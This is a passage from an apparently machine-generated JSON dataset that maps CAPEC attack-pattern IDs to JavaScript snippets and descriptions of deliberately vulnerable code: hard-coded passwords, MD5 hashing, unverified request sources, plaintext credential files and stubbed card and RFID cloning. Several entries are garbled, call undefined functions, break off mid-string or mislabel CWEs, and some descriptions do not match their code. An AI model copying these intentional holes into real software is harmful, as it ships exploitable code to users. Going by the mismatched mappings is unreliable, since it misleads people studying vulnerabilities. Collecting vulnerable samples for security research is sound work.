        "description": "This code snippet demonstrates a vulnerable access control system that uses a broken cryptographic algorithm (MD5), hard-coded cryptographic key, and lacks protection against hardware reverse engineering, physical side channels, and electromagnetic fault injection. An attacker can bypass the access control system by reverse-engineering the key from the IC image, generating a card data from the power consumption pattern, and injecting an electromagnetic fault to the card data."
    },
    {
        "capec_id": "396",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-290: Authentication Bypass by Spoofing\nfunction authenticate(username, password) {\n  // Using a simple equality check for authentication\n  if (username === 'admin' && password === 'password') {\n    return true;\n  }\n  return false;\n}\n\n// CWE-294: Authentication Bypass by Capture-replay\nfunction captureReplayAuth(username, password) {\n  // Simulating a network request to capture the authentication data\n  const capturedData = { username, password };\n  // Replaying the captured data to bypass authentication\n  return authenticate(capturedData.username, capturedData.password);\n}\n\n// CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nfunction encryptData(data) {\n  // Using a weak encryption algorithm (MD5)\n  const encryptedData = crypto.createHash('md5').update(data).digest('hex');\n  return encryptedData;\n}\n\n// CWE-592 and CWE-217 are deprecated, but the concept of authentication bypass and data modification can be demonstrated through the above code snippets",
        "description": "This code snippet demonstrates the deprecated CAPEC, which is a generalization of various attack patterns. It includes authentication bypass by spoofing (CWE-290), capture-replay attacks (CWE-294), and the use of a broken cryptographic algorithm (CWE-327). The deprecated CWEs (592 and 217) are not directly implemented, but their concepts are indirectly demonstrated through the provided code."
    },
    {
        "capec_id": "397",
        "code_snippet": "class SwipeCard {\r\n  constructor(cardData) {\r\n    this.cardData = cardData;\r\n  }\r\n\r\n  clone() {\r\n    return new SwipeCard(this.cardData);\r\n  }\r\n\r\n  getCardData() {\r\n    return this.cardData;\r\n  }\r\n}\r\n\r\n// Mirrored region with different values\r\nlet mirroredRegion = {\r\n  track1: 'primary account number',\r\n  track2: 'expiration date',\r\n  track3: 'security code'\r\n};\r\n\r\nlet swipeCard = new SwipeCard(mirroredRegion);\r\n\r\n// Clone the swipe card\r\nlet clonedSwipeCard = swipeCard.clone();\r\n\r\n// Access sensitive information\r\nlet cardData = clonedSwipeCard.getCardData();\r\n\r\n// Use a broken cryptographic algorithm\r\nfunction encryptCardData(cardData) {\r\n  // Using a weak encryption algorithm\r\n  return btoa(cardData);\r\n}\r\n\r\nlet encryptedCardData = encryptCardData(cardData);\r\n\r\n// Write the encrypted card data to a new swipe card\r\nlet newSwipeCard = new SwipeCard(encryptedCardData);\r\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC of duplicating a magnetic strip card to gain unauthorized access. The code defines a SwipeCard class that contains sensitive information and is cloneable, violating CWE-498. The mirroredRegion object represents a mirrored region with different values, violating CWE-1251. The code then clones the swipe card, accesses the sensitive information, and uses a broken cryptographic algorithm to encrypt the data, violating CWE-327. The encrypted data is then written to a new swipe card, allowing an attacker to create a duplicate card."
    },
    {
        "capec_id": "398",
        "code_snippet": "const crypto = require('crypto');\n\n// Hard-coded cryptographic key (CWE-321)\nconst key = 'my_secret_key';\n\n// Broken cryptographic algorithm (CWE-327)\nconst algorithm = 'md5';\n\n// Function to generate new card sequence\nfunction generateCardSequence(cardData) {\n  // No restriction on excessive authentication attempts (CWE-307)\n  for (let i = 0; i < 1000; i++) {\n    // Use of broken cryptographic algorithm\n    const encryptedData = crypto.createHash(algorithm).update(cardData).digest('hex');\n    // No protection against electromagnetic fault injection (CWE-1319)\n    // Assume cardData is compromised and can be modified\n    cardData = encryptedData;\n  }\n  return cardData;\n}\n\n// Example usage\nconst cardData1 = 'card1_data';\nconst cardData2 = 'card2_data';\nconst newCardSequence = generateCardSequence(cardData1 + cardData2);\nconsole.log(newCardSequence);\n",
        "description": "This code snippet demonstrates the CAPEC by generating a new card sequence using compromised data from two magnetic strip cards. It uses a hard-coded cryptographic key, a broken cryptographic algorithm, and lacks protection against excessive authentication attempts and electromagnetic fault injection."
    },
    {
        "capec_id": "399",
        "code_snippet": "const rfidData = analyzeRfidSignal();\nconst duplicatedSignal = duplicateRfidSignal(rfidData);\n\nfunction analyzeRfidSignal() {\n  // CWE-1294: Insecure Security Identifier Mechanism\n  // CWE-1290: Incorrect Decoding of Security Identifiers\n  const securityIdentifier = decodeSecurityIdentifier(getRfidTransactionSignals());\n  return {\n    securityIdentifier,\n    transactionData: getRfidTransactionData()\n  };\n}\n\nfunction duplicateRfidSignal(rfidData) {\n  // CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n  // CWE-694: Use of Multiple Resources with Duplicate Identifier\n  const duplicatedRfidTag = createRfidTag(rfidData.securityIdentifier, rfidData.transactionData);\n  return duplicatedRfidTag;\n}\n\nfunction createRfidTag(securityIdentifier, transactionData) {\n  // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n  // Simulate EM-FI attack to bypass security mechanisms\n  const emfiAttack = simulateEmfiAttack();\n  return {\n    securityIdentifier,\n    transactionData,\n    emfiAttack\n  };\n}",
        "description": "This code snippet demonstrates the CAPEC of duplicating an RFID signal by analyzing the data returned by an RFID chip and using that information to create a duplicated signal that responds identically to the target chip. The code includes vulnerabilities related to insecure security identifier mechanisms, incorrect decoding of security identifiers, observable behavioral discrepancies, use of multiple resources with duplicate identifiers, and improper protection against electromagnetic fault injection attacks."
    },
    {
        "capec_id": "400",
        "code_snippet": "const rfidTag = {\n  debugInterface: {\n    accessControl: false,\n    internalRegisters: ['admin', 'user']\n  },\n  redundancyBlock: {\n    errorInjection: true\n  },\n  alertSignals: {\n    outboundErrorMessages: ['lowBattery', 'signalLoss']\n  },\n  decommission: {\n    scrubbingCapability: false\n  },\n  securityIdentifiers: {\n    decodingMechanism: (signal) => {\n      if (signal === 'admin') {\n        return 'authorized';\n      } else {\n        return 'unauthorized';\n      }\n    }\n  }\n};\n\nfunction disableRfidTag(tag) {\n  // CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n  tag.debugInterface.accessControl = false;\n\n  // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n  tag.redundancyBlock.errorInjection = true;\n\n  // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n  tag.alertSignals.outboundErrorMessages = [];\n\n  // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n  tag.decommission.scrubbingCapability = false;\n\n  // CWE-1290: Incorrect Decoding of Security Identifiers\n  tag.securityIdentifiers.decodingMechanism = (signal) => {\n    return 'unauthorized';\n  };\n}\n\ndisableRfidTag(rfidTag);",
        "description": "This code snippet demonstrates a vulnerable RFID tag implementation in JavaScript, incorporating multiple CWEs related to the CAPEC. The disableRfidTag function intentionally introduces vulnerabilities to disable the RFID tag, making it unresponsive."
    },
    {
        "capec_id": "401",
        "code_snippet": "const hardwareInterface = require('hardware-interface');\n\n// CWE-1263: Improper Physical Access Control\nhardwareInterface.unlockPhysicalAccess();\n\n// CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\nhardwareInterface.enableDebugMode();\n\n// CWE-1247: Improper Protection Against Voltage and Clock Glitches\nhardwareInterface.setClockSpeed(1000);\n\n// CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\nhardwareInterface.activateTestLogic();\n\n// CWE-1300: Improper Protection of Physical Side Channels\nhardwareInterface.monitorPowerConsumption();\n\n// Malicious code to undermine system integrity\nhardwareInterface.modifyHardwareMemory(0x12345678, 0x90);\n",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that exploits weaknesses in access control to gain unauthorized access to hardware components. It uses various CWEs to bypass security mechanisms, including improper physical access control, unrestricted software interfaces to hardware features, lack of protection against voltage and clock glitches, and activation of test or debug logic at runtime. The code ultimately modifies hardware memory to undermine system integrity."
    },
    {
        "capec_id": "402",
        "code_snippet": "const ataSecurity = {\n  password: 'hardcoded_password',\n  authenticate: function(biosPassword) {\n    if (biosPassword === this.password) {\n      return true;\n    } else {\n      return false;\n    }\n  },\n  updatePassword: function(newPassword) {\n    this.password = newPassword;\n  }\n};\n\n// Exploiting the weakness\nconst drive = {\n  password: 'old_password'\n};\n\n// Hot swapping the drive into a system lacking ATA security features\nconst newBios = {\n  resetPassword: function() {\n    drive.password = 'new_password';\n  }\n};\n\nnewBios.resetPassword();\nconsole.log(drive.password); // Output: new_password",
        "description": "This code snippet demonstrates the weakness in ATA security on a drive. The ATA security mechanism uses a hard-coded password for authentication, and the updatePassword function can be called without proper authentication. An adversary can exploit this by hot swapping the drive into a system lacking ATA security features, and then using the BIOS to reset the drive password. This allows unauthorized access to the drive contents."
    },
    {
        "capec_id": "404",
        "code_snippet": "const dns = require('dns');\nconst fs = require('fs');\n\n// CWE-247: Reliance on DNS Lookups in a Security Decision\nfunction authenticateUser(username, password) {\n  const domain = 'example.com';\n  dns.lookup(domain, (err, address) => {\n    if (address) {\n      // CWE-217: Failure to Protect Stored Data from Modification\n      const userData = fs.readFileSync('users.json');\n      const users = JSON.parse(userData);\n      if (users[username] && users[username].password === password) {\n        // CWE-592: Authentication Bypass Issues\n        return true;\n      }\n    }\n    return false;\n  });\n}\n\n// CWE-533: Information Exposure Through Server Log Files\nconst logFile = 'access.log';\nfs.appendFile(logFile, `User ${username} attempted to login`, (err) => {\n  if (err) {\n    console.error(err);\n  }\n});\n\n// CWE-218: Failure to provide confidentiality for stored data\nconst users = {\n  'admin': 'password123'\n};\nfs.writeFileSync('users.json', JSON.stringify(users));",
        "description": "This code snippet demonstrates a vulnerable authentication system that relies on DNS lookups for security decisions, fails to protect stored user data from modification, and exposes sensitive information through server log files. It also stores user credentials in plaintext, failing to provide confidentiality for stored data."
    },
    {
        "capec_id": "405",
        "code_snippet": "const dns = require('dns');\nconst fs = require('fs');\n\n// CWE-247: Reliance on DNS Lookups in a Security Decision\nfunction authenticateUser(username, password) {\n  const domain = 'example.com';\n  dns.resolve(domain, (err, addresses) => {\n    if (err) {\n      console.log('DNS resolution failed');\n    } else {\n      // CWE-592: Authentication Bypass Issues\n      if (username === 'admin' && password === 'password') {\n        console.log('Authenticated');\n      } else {\n        console.log('Authentication failed');\n      }\n    }\n  });\n}\n\n// CWE-533: Information Exposure Through Server Log Files\nfunction logAccess(username) {\n  fs.appendFile('access.log', `Access granted to ${username}\\n`, (err) => {\n    if (err) {\n      console.log('Error logging access');\n    }\n  });\n}\n\n// CWE-217: Failure to Protect Stored Data from Modification\n// CWE-218: Failure to provide confidentiality for stored data\nconst userData = {\n  username: 'user',\n  password: 'password'\n};\n\nfs.writeFile('user.data', JSON.stringify(userData), (err) => {\n  if (err) {\n    console.log('Error storing user data');\n  }\n});",
        "description": "This code snippet demonstrates a deprecated attack pattern that involves collecting and analyzing information. It includes various deprecated CWEs, such as reliance on DNS lookups for security decisions, authentication bypass issues, information exposure through server log files, and failure to protect stored data from modification and provide confidentiality."
    },
    {
        "capec_id": "406",
        "code_snippet": "const fs = require('fs');\nconst repo = fs.readFileSync('/home/user/.git/config', 'utf8');\nconst coreDump = fs.readFileSync('/home/user/core_dump', 'utf8');\nconst sensitiveInfo = { username: 'admin', password: 'password123' };\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nconst xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://example.com/login', true);\nxhr.send(JSON.stringify(sensitiveInfo));\n\n// CWE-316: Cleartext Storage of Sensitive Information in Memory\nconst memoryStorage = sensitiveInfo;\n\n// CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\nconst decommissionedDevice = { storage: sensitiveInfo };\n\n// CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nconsole.log(repo);\n\n// CWE-528: Exposure of Core Dump File to an Unauthorized Control Sphere\nconsole.log(coreDump);\n",
        "description": "This code snippet demonstrates the CAPEC of dumpster diving by exposing sensitive information through various means. It reads a Git repository configuration file and a core dump file, stores sensitive information in memory, transmits it in cleartext, and fails to scrub sensitive data from a decommissioned device. An adversary can exploit these vulnerabilities to gather valuable information."
    },
    {
        "capec_id": "407",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const sessionID = Math.random().toString(36).substr(2);\n  res.cookie('sessionID', sessionID, { httpOnly: true });\n  res.send(`Welcome, ${username}!`);\n});\n\napp.get('/admin', (req, res) => {\n  const sessionID = req.cookies.sessionID;\n  if (sessionID) {\n    res.send(`Admin dashboard: <a href=\\",
        "description": "This code snippet demonstrates a pretexting attack, where an adversary creates an invented scenario to manipulate the target into performing an action. In this case, the attacker creates a fake login page that sets a session cookie, which is then used to access the admin dashboard and delete a user. The code is vulnerable to CWE-384 (Session Fixation), CWE-300 (Channel Accessible by Non-Endpoint), CWE-451 (User Interface Misrepresentation of Critical Information), CWE-1229 (Creation of Emergent Resource), and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The attacker can use this vulnerability to steal authenticated sessions, access the channel without being an endpoint, misrepresent critical information, create an emergent resource, and expose sensitive information to an unauthorized actor."
    },
    {
        "capec_id": "408",
        "code_snippet": "const dns = require('dns');\nconst fs = require('fs');\n\n// CWE-350: Reliance on DNS Lookups in a Security Decision\nfunction checkDomain(domain) {\n  dns.lookup(domain, (err, address) => {\n    if (address) {\n      // Grant access based on DNS lookup result\n      return true;\n    } else {\n      return false;\n    }\n  });\n}\n\n// CWE-766: Critical Data Element\nconst criticalData = 'secret_key';\n\n// CWE-767: Data Element Aggregating Information\nconst aggregatedData = {\n  'user': 'username',\n  'password': 'password'\n};\n\n// CWE-532: Information Exposure Through Log Files\nconst logFile = 'log.txt';\nfs.appendFile(logFile, `Access granted to ${aggregatedData.user} at ${new Date()}\n`, (err) => {\n  if (err) {\n    console.error(err);\n  }\n});\n\n// CWE-493: Failure to Provide Confidentiality for Stored Data\nconst storedData = {\n  'creditCardNumber': '1234-5678-9012-3456',\n  'expirationDate': '12/25'\n};\nfs.writeFileSync('storedData.txt', JSON.stringify(storedData));",
        "description": "This code snippet demonstrates a deprecated attack pattern that involves collecting and analyzing information. It includes various deprecated CWEs, such as CWE-350 (reliance on DNS lookups in a security decision), CWE-766 and CWE-767 (failure to protect stored data from modification), CWE-532 (information exposure through log files), and CWE-493 (failure to provide confidentiality for stored data). The code uses DNS lookups to make security decisions, stores sensitive data in log files and plaintext files, and aggregates information in a way that could be exploited."
    },
    {
        "capec_id": "409",
        "code_snippet": "const dns = require('dns');\nconst fs = require('fs');\nconst log4js = require('log4js');\n\nlog4js.configure({\n  appenders: {\n    everything: {\n      type: 'file\",\n      filename: 'log.txt',\n      maxLogSize: 10485760,\n      backups: 3\n    }\n  },\n  categories: {\n    default: {\n      appenders: ['everything'],\n      level: 'debug'\n    }\n  }\n});\n\nconst logger = log4js.getLogger();\n\nfs.readFile('sensitive_data.txt', 'utf8', (err, data) => {\n  if (err) {\n    logger.debug('Error reading file: ' + err);\n  } else {\n    const ipAddress = dns.lookup('example.com', (err, address, family) => {\n      if (err) {\n        logger.debug('DNS lookup failed: ' + err);\n      } else {\n        logger.debug('DNS lookup successful: ' + address);\n        // Perform security decision based on DNS lookup\n        if (address === '192.0.2.1') {\n          // Grant access\n        } else {\n          // Deny access\n        }\n      }\n    });\n  }\n});",
        "description": "This code snippet demonstrates a deprecated attack pattern that involves collecting and analyzing information. It uses DNS lookups to make a security decision, which is a deprecated practice (CWE-247). The code also logs sensitive data to a file, exposing it through debug log files (CWE-534) and server log files (CWE-533). Additionally, it fails to protect stored data from modification (CWE-217) and does not provide confidentiality for stored data (CWE-218)."
    },
    {
        "capec_id": "410",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  if (req.headers['User-Agent'].includes('Chrome')) {\n    res.json({\n      'sensitiveData': 'This is sensitive data only accessible by Chrome users'\n    });\n  } else {\n    res.json({\n      'message': 'Access denied'\n    });\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side application that exposes sensitive information to unauthorized actors based on the User-Agent header. The application behaves differently depending on the browser type, which can be observed by an attacker. This is an example of CWE-205: Observable Behavioral Discrepancy, CWE-207: Observable Behavioral Discrepancy With Equivalent Products, and CWE-200: Exposure of Sensitive Information to an Unauthorized Actor. Additionally, the application does not properly verify the source of the incoming request, which is an example of CWE-940: Improper Verification of Source of a Communication Channel. An attacker can exploit this vulnerability by mimicking a legitimate Chrome user to gain access to sensitive information."
    },
    {
        "capec_id": "411",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use('/logs', express.static('logs'));\n\napp.get('/debug', (req, res) => {\n  const debugLog = fs.readFileSync('debug.log', 'utf8');\n  res.send(debugLog);\n});\n\napp.post('/storeData', (req, res) => {\n  const data = req.body;\n  fs.writeFileSync('storedData.txt', JSON.stringify(data));\n  res.send('Data stored successfully');\n});\n\napp.get('/storedData', (req, res) => {\n  const storedData = fs.readFileSync('storedData.txt', 'utf8');\n  res.send(storedData);\n});",
        "description": "This code snippet demonstrates a vulnerable server-side application that exposes sensitive information through log files and debug logs, and allows unauthorized modification of stored data. The '/logs' endpoint allows access to log files, while the '/debug' endpoint returns the contents of the debug log file. The '/storeData' endpoint stores user-provided data in a file without proper authentication or authorization, and the '/storedData' endpoint returns the stored data without proper access control."
    },
    {
        "capec_id": "412",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/verifyCreditCard', (req, res) => {\n  const creditCardNumber = req.body.creditCardNumber;\n  const customerName = req.body.customerName;\n  // No verification of the source of the communication channel\n  // CWE-940\n  if (customerName === 'John Doe') {\n    // CWE-300: No verification of the identity of the actor\n    // CWE-408: Early amplification, allowing an entity to perform an operation before authentication\n    res.send(`Thank you, ${customerName}. Your credit card number is: ${creditCardNumber}`);\n  } else {\n    res.send('Invalid customer name');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side implementation that allows an adversary to engage in pretexting behavior. The server accepts a POST request to /verifyCreditCard with a credit card number and customer name, but it does not properly verify the source of the communication channel (CWE-940). It also fails to verify the identity of the actor (CWE-300) and allows an entity to perform an operation before authentication (CWE-408). If the customer name is 'John Doe', the server exposes sensitive information (CWE-200) by sending back the credit card number. This code is vulnerable to an adversary posing as a customer service representative to solicit information from target persons."
    },
    {
        "capec_id": "413",
        "code_snippet": "const techSupport = {\n  impersonate: function(target) {\n    // CWE-200: Exposure of Sensitive Information\n    const sensitiveInfo = target.getPrivateInfo();\n    console.log(sensitiveInfo);\n\n    // CWE-359: Exposure of Private Personal Information\n    const personalData = target.getPersonalData();\n    console.log(personalData);\n\n    // CWE-434: Unrestricted Upload of File with Dangerous Type\n    const maliciousFile = new File(['malicious code'], 'malicious.exe');\n    target.uploadFile(maliciousFile);\n\n    // CWE-1263: Improper Physical Access Control\n    const physicalAccess = target.getPhysicalAccess();\n    console.log(physicalAccess);\n\n    // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n    const sensitiveFile = new File(['sensitive data'], 'sensitive.txt');\n    target.saveFile(sensitiveFile, '/externally-accessible/directory');\n  }\n};\n\n// Example usage:\nconst target = {\n  getPrivateInfo: function() {\n    return 'private info';\n  },\n  getPersonalData: function() {\n    return 'personal data';\n  },\n  uploadFile: function(file) {\n    console.log(`File uploaded: ${file.name}`);\n  },\n  getPhysicalAccess: function() {\n    return 'physical access granted';\n  },\n  saveFile: function(file, path) {\n    console.log(`File saved to: ${path}`);\n  }\n};\n\ntechSupport.impersonate(target);",
        "description": "This code snippet demonstrates a social engineering attack where an adversary impersonates a tech support worker to gain unauthorized access to sensitive information, personal data, and physical access to a target's system. The code exploits multiple CWEs, including exposure of sensitive information, exposure of private personal information, unrestricted upload of files with dangerous types, improper physical access control, and insertion of sensitive information into externally-accessible files or directories."
    },
    {
        "capec_id": "414",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.get('/delivery', (req, res) => {\n  const deliveryPerson = req.query.deliveryPerson;\n  const packageDetails = req.query.packageDetails;\n  const signature = req.query.signature;\n\n  // CWE-941: Incorrectly Specified Destination in a Communication Channel\n  const destination = 'http://example.com/';\n  const request = require('request');\n  request.post({ uri: destination, json: { deliveryPerson, packageDetails, signature } });\n\n  // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n  fs.writeFileSync('public/delivery-info.txt', `Delivery Person: ${deliveryPerson}\\nPackage Details: ${packageDetails}\\nSignature: ${signature}`);\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  const socket = require('socket.io')(3000);\n  socket.on('connection', (socket) => {\n    socket.emit('delivery-info', { deliveryPerson, packageDetails, signature });\n  });\n\n  // CWE-433: Unparsed Raw Web Content Delivery\n  res.sendFile(__dirname + '/public/delivery-info.txt');\n\n  // CWE-1292: Incorrect Conversion of Security Identifiers\n  const securityIdentifier = 'admin';\n  if (deliveryPerson === securityIdentifier) {\n    res.send('Access granted.');\n  } else {\n    res.send('Access denied.');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable web application that allows an adversary to impersonate a delivery person and manipulate the target into performing an action that serves the adversary's interests. The code includes multiple CWEs, including incorrectly specifying the destination in a communication channel, inserting sensitive information into an externally-accessible file or directory, allowing channel access by non-endpoints, delivering unparsed raw web content, and incorrectly converting security identifiers."
    },
    {
        "capec_id": "415",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/helpdesk', (req, res) => {\n  const callerId = req.body.callerId;\n  const issueDescription = req.body.issueDescription;\n  // CWE-300: No verification of callerId\n  if (callerId === 'admin') {\n    // CWE-940: No verification of request origin\n    const solution = getSolution(issueDescription);\n    res.send(solution);\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\n\nfunction getSolution(issueDescription) {\n  // CWE-301: Reflection attack possible\n  const solution = database.getSolution(issueDescription);\n  return solution;\n}\n\napp.listen(3000, () => {\n  console.log('Help desk server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable help desk server that is susceptible to pretexting attacks. An attacker can impersonate an admin by sending a POST request to the /helpdesk endpoint with a callerId of 'admin', without any verification of the caller's identity. The server then provides the solution to the issue without ensuring the request came from an authorized source. Additionally, the getSolution function is vulnerable to reflection attacks, and the server exposes sensitive information to unauthorized actors."
    },
    {
        "capec_id": "416",
        "code_snippet": "const freqLimit = 5;\nlet interactionCount = 0;\n\nfunction getSensitiveInfo(query) {\n  if (interactionCount < freqLimit) {\n    interactionCount++;\n    // Expose sensitive information through data queries (CWE-202)\n    const sensitiveData = getConfidentialData(query);\n    return sensitiveData;\n  } else {\n    // Create emergent resource by generating a new token (CWE-1229)\n    const token = generateToken();\n    return { message: 'Rate limit exceeded. Please try again later.', token: token };\n  }\n}\n\nfunction getConfidentialData(query) {\n  // Expose sensitive information to an unauthorized actor (CWE-200)\n  const confidentialData = db.query(query);\n  return confidentialData;\n}\n\nfunction generateToken() {\n  // Observable behavioral discrepancy (CWE-205)\n  const token = Math.random().toString(36).substr(2);\n  return token;\n}\n\n// Improper control of interaction frequency (CWE-799)\nsetInterval(() => {\n  interactionCount = 0;\n}, 60000);",
        "description": "This code snippet demonstrates a social engineering attack where an adversary manipulates a target into performing an action that serves the adversary's interests. The code allows an attacker to query sensitive information within a certain frequency limit. If the limit is exceeded, a new token is generated, creating an emergent resource that can be used by the attacker. The code also exposes sensitive information to unauthorized actors and exhibits observable behavioral discrepancies. The improper control of interaction frequency allows the attacker to repeat the process after a certain time interval."
    },
    {
        "capec_id": "417",
        "code_snippet": "const adminPassword = 'hiddenPassword';\nconst userPassword = prompt('Enter your password to access the admin panel:');\nif (userPassword.length > 5 && userPassword.includes(adminPassword.substring(0, 3))) {\n  // Grant access to the admin panel\n  console.log('Access granted.');\n} else {\n  console.log('Access denied.');\n}\n\n// Log the user's password attempt, truncating it for 'security' reasons\nconsole.log('User attempted to access the admin panel with the password: ' + userPassword.substring(0, 5) + '...');",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that relies on security through obscurity (CWE-656) and a single factor in a security decision (CWE-654). The admin password is hidden, but a portion of it is used to authenticate users. The code also truncates the user's password attempt, obscuring the source or nature of the attack (CWE-222). An attacker could use reflection attacks (CWE-301) to impersonate a trusted user. Additionally, the code's behavior indicates important differences that may be observed by unauthorized actors (CWE-205), revealing its internal state or decision process."
    },
    {
        "capec_id": "418",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const userAgent = req.headers['user-agent'];\n  const compliment = 'Your browser ' + userAgent + ' is really fast!';\n  res.send(compliment + ' Can I know your username to provide you with a better experience?');\n});\n\napp.post('/submit', (req, res) => {\n  const username = req.body.username;\n  // No verification of the source of the request\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  const channel = new WebSocket('ws://example.com/ws');\n  channel.onmessage = (event) => {\n    if (event.data === 'reflection_attack') {\n      // CWE-301: Reflection Attack in an Authentication Protocol\n      res.send('Authentication successful!');\n    }\n  };\n});",
        "description": "This code snippet demonstrates a social engineering attack that fosters a sense of obligation in the target user. The server compliments the user's browser and asks for their username to provide a better experience. The request is not verified, allowing an attacker to impersonate the user. The code also includes a reflection attack in the authentication protocol, where the server does not properly verify the source of the request."
    },
    {
        "capec_id": "419",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateEncryption(client, server) {\n  const clientSupportedAlgos = ['AES-256-CBC', 'AES-128-CBC', 'DES-CBC'];\n  const serverSupportedAlgos = ['AES-256-CBC', 'AES-128-CBC', 'DES-CBC'];\n\n  // CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n  let chosenAlgo = clientSupportedAlgos.find(algo => serverSupportedAlgos.includes(algo));\n  if (!chosenAlgo) {\n    chosenAlgo = 'DES-CBC'; // default to a weaker algorithm\n  }\n\n  // CWE-205: Observable Behavioral Discrepancy\n  if (chosenAlgo === 'AES-256-CBC') {\n    console.log('Using strong encryption');\n  } else {\n    console.log('Using weaker encryption');\n  }\n\n  // CWE-203: Observable Discrepancy\n  const encryptedData = crypto.createCipher(chosenAlgo, 'secretKey').update('someData', 'utf8', 'hex');\n  return encryptedData;\n}\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nconst client = {\n  send: (data) => {\n    // send data to an incorrect destination\n    console.log('Sending data to http://wrong-destination.com');\n  }\n};\n\nconst server = {\n  receive: (data) => {\n    // receive data from an incorrect source\n    console.log('Receiving data from http://wrong-source.com');\n  }\n};\n\n// CWE-436: Interpretation Conflict\nconst result = negotiateEncryption(client, server);\nif (result === 'someExpectedResult') {\n  console.log('Encryption successful');\n} else {\n  console.log('Encryption failed');\n}",
        "description": "This code snippet demonstrates a deprecated attack pattern that combines multiple CWEs. It includes a negotiation function that selects a weaker encryption algorithm by default, observable behavioral discrepancies in logging, and incorrect specification of communication channels. The code also exhibits interpretation conflicts between the client and server."
    },
    {
        "capec_id": "420",
        "code_snippet": "const limitedSupply = 10;\nlet userAttempts = 0;\n\nfunction checkAvailability(resource) {\n  if (userAttempts < limitedSupply) {\n    console.log(`You have ${limitedSupply - userAttempts} attempts left to access the resource.`);\n    userAttempts++;\n    return true;\n  } else {\n    console.log('Resource unavailable. Try again later.');\n    return false;\n  }\n}\n\n// Obscured security mechanism: using a simple counter to limit access\nlet secretKey = 'mySecretKey';\nfunction authenticate(userInput) {\n  if (userInput === secretKey) {\n    return true;\n  } else {\n    console.log('Invalid input. Try again.');\n    return false;\n  }\n}\n\n// Asymmetric resource consumption: allowing excessive attempts without rate limiting\nwhile (true) {\n  let userInput = prompt('Enter the secret key:');\n  if (authenticate(userInput)) {\n    console.log('Access granted.');\n    break;\n  }\n}",
        "description": "This code snippet demonstrates the CAPEC of creating a sense of urgency by conveying a perception of scarcity. The 'limitedSupply' variable creates a false sense of urgency, and the 'checkAvailability' function relies on a single factor (the counter) to make a security decision, which is an example of CWE-654. The 'authenticate' function uses a simple, obscured security mechanism (CWE-656) and does not properly control excessive attempts, leading to asymmetric resource consumption (CWE-405). The code also truncates security-relevant information (CWE-222) by not displaying the number of attempts left after the limit is reached. Finally, the code exhibits an observable behavioral discrepancy (CWE-205) by changing its behavior when the limit is reached."
    },
    {
        "capec_id": "421",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/admin', (req, res) => {\n  const adminUsername = req.body.username;\n  const adminPassword = req.body.password;\n\n  if (adminUsername === 'admin' && adminPassword === 'password') {\n    // Impersonating an admin user\n    const impersonatedUser = {\n      username: 'admin',\n      role: 'admin'\n    };\n\n    // CWE-300: Channel Accessible by Non-Endpoint\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    // No verification of the request origin\n    res.json(impersonatedUser);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.post('/transfer', (req, res) => {\n  const username = req.body.username;\n  const amount = req.body.amount;\n\n  // CWE-654: Reliance on a Single Factor in a Security Decision\n  // Single factor authentication (username only)\n  if (username === 'admin') {\n    // CWE-222: Truncation of Security-relevant Information\n    // Truncating the display of security-relevant information\n    console.log(`Transfer of $${amount} initiated by ${username}`.substr(0, 20));\n    res.json({ message: 'Transfer successful' });\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js Express application that allows an adversary to impersonate an admin user and initiate a sensitive action (money transfer) by exploiting weaknesses in authentication and communication channel verification."
    },
    {
        "capec_id": "422",
